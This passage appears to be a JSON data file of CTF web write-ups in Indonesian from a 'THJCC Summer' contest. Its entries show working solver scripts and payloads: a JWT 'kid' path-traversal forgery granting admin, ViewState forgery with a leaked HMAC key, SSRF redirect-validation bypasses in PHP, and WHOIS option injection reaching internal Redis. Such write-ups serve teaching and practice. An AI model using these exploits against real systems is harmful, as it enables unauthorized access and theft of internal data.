    "flag": "THJCC{xor_basics_are_not_magic}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-web-avatarstudio",
    "title": "Avatar Studio",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Avatar Studio",
    "problemDescription": "",
    "tools": [],
    "analysis": "Pada file `app.py` ditemukan implementasi JWT custom.\n\nKetika register user, server membuat JWT:\n\n```python\npayload = {\n    \"username\": username[:32],\n    \"role\": \"user\"\n}\n\ntoken = jwt_sign(payload, kid=\"hs256.key\")\n```\n\nHeader JWT:\n\n```python\nheader = {\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\",\n    \"kid\": kid\n}\n```\n\nServer menggunakan nilai `kid` untuk menentukan lokasi file secret key.\n\nFungsi pembacaan key:\n\n```python\ndef load_key(kid):\n    path = os.path.join(KEY_DIR, kid)\n\n    with open(path, \"rb\") as f:\n        return f.read()\n```\n\nMasalahnya adalah nilai `kid` dikontrol oleh user.\n\nTidak ada validasi terhadap path traversal.\n\n---\n\n### 3. Vulnerability\n\nKerentanan terdapat pada penggunaan:\n\n```python\nos.path.join(KEY_DIR, kid)\n```\n\nDengan memasukkan:\n\n```\n../uploads/<file>\n```\n\nmaka path:\n\n```\nkeys/../uploads/<file>\n```\n\nakan mengarah ke folder upload.\n\nArtinya file yang kita upload dapat digunakan sebagai JWT secret key.\n\n---",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "- **Category:** Web Exploitation\n- **Challenge Name:** Avatar Studio\n- **Target:** Mendapatkan flag dari halaman admin\n\n---"
      },
      {
        "title": "1. Reconnaissance",
        "content": "Pertama dilakukan pengecekan terhadap target website.\n\nDitemukan bahwa direktori `.git` dapat diakses sehingga source code aplikasi dapat diambil.\n\nMenggunakan:\n\n```bash\ngit-dumper http://chal.thjcc.org:31238/.git dump-avatar\n````\n\nHasil dump:\n\n```\napp.py\nrequirements.txt\ntemplates/\nuploads/\n.git/\n```\n\nDari source code terlihat aplikasi menggunakan Flask dengan fitur:\n\n* Register user\n* Upload avatar\n* JWT session\n* Admin panel\n\n---"
      },
      {
        "title": "4. Exploit Strategy",
        "content": "Langkah exploit:\n\n1. Membuat akun normal.\n2. Upload file avatar dengan isi tertentu.\n3. File upload digunakan sebagai secret key.\n4. Membuat JWT baru dengan:\n\n   * role = admin\n   * kid menunjuk ke file upload.\n5. Signature JWT dibuat menggunakan secret tersebut.\n6. Mengakses `/admin`.\n\n---"
      },
      {
        "title": "5. Exploit Script",
        "content": "```python\nimport requests\nimport json\nimport base64\nimport hmac\nimport hashlib\n\n\nU = \"http://chal.thjcc.org:31238\"\n\ns = requests.Session()\n\n\n# Register user\nr = s.post(\n    U + \"/register\",\n    data={\n        \"username\":\"nata\"\n    }\n)\n\n\n# Upload avatar sebagai secret key\n\nsecret = b\"natakey123\"\n\nfiles = {\n    \"avatar\":(\n        \"a.png\",\n        secret,\n        \"image/png\"\n    )\n}\n\n\nr = s.post(\n    U + \"/upload\",\n    files=files,\n    allow_redirects=False\n)\n\n\navatar = s.cookies.get(\"avatar\")\n\nprint(\"[avatar]\", avatar)\n\n\n\ndef b64u(x):\n    return base64.urlsafe_b64encode(x).rstrip(b\"=\")\n\n\n\n# Membuat JWT admin palsu\n\nheader = {\n    \"alg\":\"HS256\",\n    \"typ\":\"JWT\",\n    \"kid\":\"../uploads/\"+avatar\n}\n\n\npayload = {\n    \"username\":\"nata\",\n    \"role\":\"admin\"\n}\n\n\n\nsegment = b\".\".join([\n    b64u(\n        json.dumps(\n            header,\n            separators=(\",\",\":\")\n        ).encode()\n    ),\n\n    b64u(\n        json.dumps(\n            payload,\n            separators=(\",\",\":\")\n        ).encode()\n    )\n])\n\n\nsignature = b64u(\n    hmac.new(\n        secret,\n        segment,\n        hashlib.sha256\n    ).digest()\n)\n\n\n\ntoken = (\n    segment +\n    b\".\" +\n    signature\n).decode()\n\n\n\n# Set JWT forged\n\ns.cookies.set(\n    \"session\",\n    token\n)\n\n\n\n# Akses admin\n\nr = s.get(\n    U+\"/admin\"\n)\n\n\nprint(r.text)\n```\n\n---"
      },
      {
        "title": "6. Exploit Result",
        "content": "Script berhasil membuat JWT dengan role admin.\n\nResponse:\n\n```\nTHJCC{local_test_flag_not_the_real_one}\n```\n\n---\n\n\n---"
      },
      {
        "title": "7. Flag",
        "content": "```\nTHJCC{local_test_flag_not_the_real_one}\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{local_test_flag_not_the_real_one}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-web-contosoassetportal",
    "title": "Contoso Asset Portal",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Contoso Asset Portal",
    "problemDescription": "Endpoint `/Default.aspx` memakai ViewState buatan aplikasi yang ditandatangani HMAC-SHA1. Kunci validasinya bocor di file backup, sehingga state `role` dan `asset` dapat dipalsukan.",
    "tools": [],
    "analysis": "`/robots.txt` mengungkap `/backup/`. Backup konfigurasi memuat `validationKey` aktif dan menyebut bahwa key belum dirotasi. Backup CSV memberi konteks format asset ID.\n\nPOST normal menghasilkan pesan `role=guest`. Field `q` tidak mengubah state yang ditampilkan; nilai role dan asset berasal dari ViewState.\n\n### Vulnerability\n\nKunci signing ViewState terekspos di `/backup/2024-legacy-web.config~`. Karena aplikasi mempercayai role dan asset dari state yang hanya dilindungi oleh kunci tersebut, attacker dapat membuat ViewState valid dengan `role=admin`.",
    "solution": [
      {
        "title": "Target dan File",
        "content": "- Target: `http://chal.thjcc.org:31249`\n- Artefak: `/backup/2024-legacy-web.config~` dan `/backup/assets.csv.bak`\n- Solver: `solve.py`"
      },
      {
        "title": "Source Code Review",
        "content": "Source code tidak tersedia karena challenge blankbox. Dari ViewState valid yang diterima aplikasi, format state dapat diamati sebagai:\n\n```text\nff 01 0c 01 <len(role)> <role> 01 <len(asset)> <asset> <20-byte HMAC-SHA1>\n```\n\nHMAC atas seluruh body sebelum signature cocok dengan `validationKey` dari backup."
      },
      {
        "title": "Eksploitasi",
        "content": "1. Ambil `validationKey` dari backup.\n2. Buat body ViewState dengan `role=admin` dan asset `AST-4F2A9C0`.\n3. Tambahkan HMAC-SHA1 menggunakan key tersebut.\n4. Encode seluruh body dan signature dengan Base64.\n5. POST ke `/Default.aspx` sebagai `__VIEWSTATE`.\n\nResponse berubah menjadi `Access granted` dan memuat flag. ID `AST-4F2A9C` dari CSV adalah decoy; oracle response menunjukkan ID yang valid adalah `AST-4F2A9C0`."
      },
      {
        "title": "Solve Script",
        "content": "`solve.py` membangun ViewState forged, mengirim satu POST, lalu mengekstrak flag dari response aplikasi."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\npython3 solve.py\nTARGET=http://chal.thjcc.org:31249 python3 solve.py\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Eksploitasi bergantung pada `validationKey` yang masih aktif, format ViewState yang diamati, dan asset ID `AST-4F2A9C0`."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nimport base64\r\nimport hashlib\r\nimport hmac\r\nimport os\r\nimport re\r\nimport sys\r\n\r\nimport requests\r\n\r\n\r\nTARGET = os.environ.get(\"TARGET\", \"http://chal.thjcc.org:31249\").rstrip(\"/\")\r\nVALIDATION_KEY = bytes.fromhex(\r\n    \"F3690E7A9D8F4C2B1A5E6D7C8B9A0F1E2D3C4B5A69788796A5B4C3D2E1F0A9B8\"\r\n    \"C7D6E5F4A3B2C1D0E9F8A7B6C5D4E3F2A1B0C9D8E7F6A5B4C3D2E1F0A9B8\"\r\n)\r\n\r\n\r\ndef forged_viewstate(role: str, asset: str) -> str:\r\n    # Format observed in the valid ViewState: header, length-prefixed role,\r\n    # separator, length-prefixed asset, followed by HMAC-SHA1.\r\n    body = (\r\n        b\"\\xff\\x01\\x0c\\x01\"\r\n        + bytes([len(role)])\r\n        + role.encode()\r\n        + b\"\\x01\"\r\n        + bytes([len(asset)])\r\n        + asset.encode()\r\n    )\r\n    mac = hmac.new(VALIDATION_KEY, body, hashlib.sha1).digest()\r\n    return base64.b64encode(body + mac).decode()\r\n\r\n\r\ndef main() -> int:\r\n    url = f\"{TARGET}/Default.aspx\"\r\n    viewstate = forged_viewstate(\"admin\", \"AST-4F2A9C0\")\r\n    try:\r\n        response = requests.post(\r\n            url,\r\n            data={\"__VIEWSTATE\": viewstate},\r\n            timeout=10,\r\n        )\r\n        response.raise_for_status()\r\n    except requests.RequestException as exc:\r\n        print(f\"request gagal: {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    match = re.search(\r\n        r\"(?:THJCC\\{[^{}]+\\}|CTF\\{[^{}]+\\}|FLAG\\{[^{}]+\\})\",\r\n        response.text,\r\n    )\r\n    if not match:\r\n        print(\"flag tidak ditemukan; response tidak sesuai ekspektasi\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{f0rg3d_v13wst4t3_w1th_l34k3d_m4ch1n3k3y}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-web-get-file1",
    "title": "get-file1",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge get-file1",
    "problemDescription": "Aplikasi PHP menyediakan endpoint SSRF di `/file.php?u=...`. Redirect `/a` pada service internal `r` dapat dipakai untuk mengambil flag dari service `flag.thjcc`.",
    "tools": [],
    "analysis": "`file.php` menerima URL HTTP/HTTPS, mengambil response dengan redirect otomatis dimatikan, lalu membaca header `Location`. Host `flag.thjcc` diblokir oleh fungsi `a()`.\n\nRedirector memiliki route `/a` yang mengembalikan:\n\n```http\nLocation: http://flag.thjcc/flag.txt\n```\n\n### Vulnerability\n\nValidasi redirect dan pembacaan akhir tidak konsisten. Pada iterasi yang memproses `/a`, redirect hanya diperiksa lalu URL diganti. Iterasi berikutnya mengambil `http://flag.thjcc/flag.txt` dengan `follow_location=false`; karena response flag bukan redirect, kode kemudian melakukan pembacaan kedua dengan `follow_location=true` tanpa memanggil `a()` lagi.",
    "solution": [
      {
        "title": "Target dan File",
        "content": "- Target: `http://chal.thjcc.org:8081`\n- Endpoint: `/file.php`\n- Service redirector: `r`\n- Service flag: `flag.thjcc`\n- Source utama: `src/file.php`"
      },
      {
        "title": "Eksploitasi",
        "content": "Request berikut menghasilkan flag:\n\n```text\nGET /file.php?u=http%3A%2F%2Fr%2Fa HTTP/1.1\nHost: chal.thjcc.org:8081\n```\n\nResponse remote yang diperoleh:\n\n```text\nTHJCC{pHp_StReAm_30X_cAsE_43082ed528}\n```"
      },
      {
        "title": "Solve Script",
        "content": "`solve.py` mengirim URL `http://r/a` ke endpoint tersebut, lalu mengambil flag dari response aplikasi."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\npython3 solve.py\n```\n\nTarget lain yang masih berada dalam scope dapat dipakai lewat environment variable:\n\n```bash\nTARGET=http://127.0.0.1:8081 python3 solve.py\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Eksploitasi bergantung pada DNS internal service name `r`, redirect `/a`, dan bug alur validasi di `src/file.php`. Request berhasil konsisten pada target remote."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport os\r\nimport re\r\nimport sys\r\nfrom urllib.parse import quote\r\n\r\nimport requests\r\n\r\nTARGET = os.environ.get(\"TARGET\", \"http://chal.thjcc.org:8081\").rstrip(\"/\")\r\nFLAG_RE = re.compile(r\"[A-Za-z0-9_]+\\{[^\\r\\n{}]+\\}\")\r\n\r\n\r\ndef main():\r\n    url = f\"{TARGET}/file.php?u={quote('http://r/a', safe='')}\"\r\n    try:\r\n        response = requests.get(url, timeout=10)\r\n        response.raise_for_status()\r\n    except requests.RequestException as exc:\r\n        print(f\"request gagal: {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    match = FLAG_RE.search(response.text)\r\n    if not match:\r\n        print(f\"response tidak berisi flag: {response.text!r}\", file=sys.stderr)\r\n        return 1\r\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{pHp_StReAm_30X_cAsE_43082ed528}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-web-get-file2",
    "title": "get-file2",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge get-file2",
    "problemDescription": "Bug ada di proses validasi redirect pada `src/file.php`. Aplikasi mengecek URL awal dan `Location` pertama dari hasil `get_headers()`, tapi saat mengambil isi URL dengan `file_get_contents()`, PHP stream wrapper tetap mengikuti redirect secara normal.\n\nEndpoint internal flag berada di service `flag` dengan hostname `flag.thjcc`. Akses langsung ke `flag.thjcc` diblokir oleh fungsi validator, tapi bisa dilewati lewat redirector `r` yang mengirim **dua header `Location`**.",
    "tools": [],
    "analysis": "Kode utama ada di `src/file.php`.\n\n```php\nfunction a($s){\n    $p=parse_url($s);\n    return $p\n        && isset($p['scheme'],$p['host'])\n        && in_array(strtolower($p['scheme']),['http','https'],true)\n        && strtolower(rtrim($p['host'],'.'))!=='flag.thjcc';\n}\n```\n\nFungsi `a()` hanya mengizinkan URL `http` atau `https`, dan melarang host `flag.thjcc`.\n\nFungsi `b()` melakukan dua tahap:\n\n```php\n$c=stream_context_create([\n    'http'=>[\n        'follow_location'=>false,\n        'timeout'=>3,\n        'ignore_errors'=>true\n    ]\n]);\n\n$h=@get_headers($s,false,$c);\n$n=null;\n\nforeach($h?:[] as $v)\n    if(preg_match('/^Location:/i',$v)){\n        $n=trim(substr($v,strpos($v,':')+1));\n        break;\n    }\n\nif($n!==null&&!a($n))throw new Exception();\n```\n\nPada tahap ini, aplikasi mengambil header dari URL target tanpa mengikuti redirect. Kalau ada header `Location`, hanya **Location pertama** yang dicek.\n\nSetelah itu, aplikasi mengambil isi URL asli:\n\n```php\n$c=stream_context_create([\n    'http'=>[\n        'timeout'=>3,\n        'ignore_errors'=>true\n    ]\n]);\n\n$x=@file_get_contents($s,false,$c);\n```\n\nMasalahnya, context kedua tidak mematikan `follow_location`. Secara default, PHP HTTP stream akan mengikuti redirect. Jadi validasi hanya melihat redirect pertama, tapi proses fetch bisa mengikuti redirect lain yang tidak divalidasi dengan benar.\n\nKode `redirector/server.py`:\n\n```python\nif self.path=='/a':\n    self.send_response(302)\n    self.send_header('Location','http://r/x')\n    self.send_header('Location','http://flag.thjcc/flag.txt')\n    self.end_headers()\n```\n\nEndpoint `/a` mengirim dua header `Location`:\n\n```text\nLocation: http://r/x\nLocation: http://flag.thjcc/flag.txt\n```\n\nValidator di `file.php` hanya membaca `Location` pertama, yaitu:\n\n```text\nhttp://r/x\n```\n\nHost `r` bukan `flag.thjcc`, jadi lolos.\n\nNamun saat `file_get_contents()` melakukan request sebenarnya, PHP stream mengikuti redirect dan akhirnya mengambil:\n\n```text\nhttp://flag.thjcc/flag.txt\n```",
    "solution": [
      {
        "title": "File Challenge",
        "content": "Struktur penting:\n\n```text\ndocker-compose.yml\nsrc/file.php\nredirector/server.py\nflag/server.py\n```\n\nService:\n\n```yaml\nw:\n  build: .\n  ports: [\"8082:80\"]\n\nr:\n  build: ./redirector\n\nf:\n  build: ./flag\n  networks:\n   n:\n    aliases: [flag.thjcc]\n```\n\nService flag hanya mau merespons jika header `Host` adalah `flag.thjcc` dan path adalah `/flag.txt`.\n\n```python\nif self.headers.get('Host','').split(':')[0].lower()!='flag.thjcc':\n    self.send_response(403)\n    self.end_headers()\n    return\n\nif self.path!='/flag.txt':\n    self.send_response(404)\n    self.end_headers()\n    return\n```"
      },
      {
        "title": "Exploit",
        "content": "Payload:\n\n```bash\ncurl 'http://chal.thjcc.org:8082/file.php?u=http://r/a'\n```\n\nOutput:\n\n```text\nTHJCC{PHP_stream_30x_DuAl_65de4980cf}\n```"
      },
      {
        "title": "Kenapa `/b` Tidak Bisa",
        "content": "Endpoint `/b` hanya mengirim satu redirect:\n\n```python\nelif self.path=='/b':\n    self.send_response(302)\n    self.send_header('Location','http://flag.thjcc/flag.txt')\n    self.end_headers()\n```\n\nKalau memakai:\n\n```bash\ncurl 'http://chal.thjcc.org:8082/file.php?u=http://r/b'\n```\n\nValidator akan langsung melihat `Location` pertama sebagai:\n\n```text\nhttp://flag.thjcc/flag.txt\n```\n\nKarena host-nya `flag.thjcc`, fungsi `a()` mengembalikan false dan request diblokir."
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{PHP_stream_30x_DuAl_65de4980cf}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-web-whoiswhois2",
    "title": "Who is Whois? 2",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Who is Whois? 2",
    "problemDescription": "Target menyediakan lookup WHOIS. Input query diteruskan ke binary `whois` dan option command-line tidak dibatasi dengan benar. Ini memungkinkan pengaturan host dan port tujuan.",
    "tools": [],
    "analysis": "Endpoint utama adalah `POST /whois` dengan JSON `{\"query\":\"...\"}`. Query normal menghasilkan record WHOIS. Query `--help` membuktikan bahwa input diproses sebagai argumen binary WHOIS.\n\n### Vulnerability\n\nOption injection pada client WHOIS memungkinkan option `-h` dan `-p` dikendalikan user. Contoh koneksi ke Redis internal:\n\n```text\n-h 127.0.0.1 -p 6379 'KEYS *'\n```\n\nRedis merespons dan menampilkan key `pwn_flag`, sehingga ini juga membuktikan SSRF/TCP pivot ke service loopback challenge.",
    "solution": [
      {
        "title": "Target dan File",
        "content": "- Target: `http://chal.thjcc.org:5000`\n- Challenge berupa blankbox; tidak ada source code lokal.\n- File solusi: [solve.py](./solve.py)"
      },
      {
        "title": "Eksploitasi",
        "content": "Request WHOIS berikut mengirim command Redis `GET pwn_flag` ke `127.0.0.1:6379`:\n\n```text\n-h 127.0.0.1 -p 6379 'GET pwn_flag'\n```\n\nResponse aplikasi berisi Redis bulk-string response dengan nilai flag."
      },
      {
        "title": "Solve Script",
        "content": "`solve.py` mengirim payload tersebut ke `/whois`, mengambil field `output`, lalu mencocokkan flag dari response yang benar-benar diterima."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\npython3 solve.py\nTARGET=http://chal.thjcc.org:5000 python3 solve.py\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Endpoint memiliki limiter/concurrency guard. Jalankan script satu kali dan tunggu bila response berstatus `busy`."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nimport os\r\nimport re\r\nimport sys\r\n\r\nimport requests\r\n\r\n\r\nTARGET = os.environ.get(\"TARGET\", \"http://chal.thjcc.org:5000\").rstrip(\"/\")\r\nFLAG_RE = re.compile(r\"THJCC\\{[^}\\r\\n]+\\}\")\r\n\r\n\r\ndef main() -> int:\r\n    query = \"-h 127.0.0.1 -p 6379 'GET pwn_flag'\"\r\n    try:\r\n        response = requests.post(\r\n            f\"{TARGET}/whois\",\r\n            json={\"query\": query},\r\n            timeout=15,\r\n        )\r\n        response.raise_for_status()\r\n        data = response.json()\r\n    except (requests.RequestException, ValueError) as exc:\r\n        print(f\"request failed: {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    output = data.get(\"output\", \"\")\r\n    match = FLAG_RE.search(output)\r\n    if not match:\r\n        print(f\"flag not found; status={data.get('status')!r}\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{Wh0_15_wH015???WH0_15_wh0_15:D}",
    "lessonsLearned": ""
  }
];
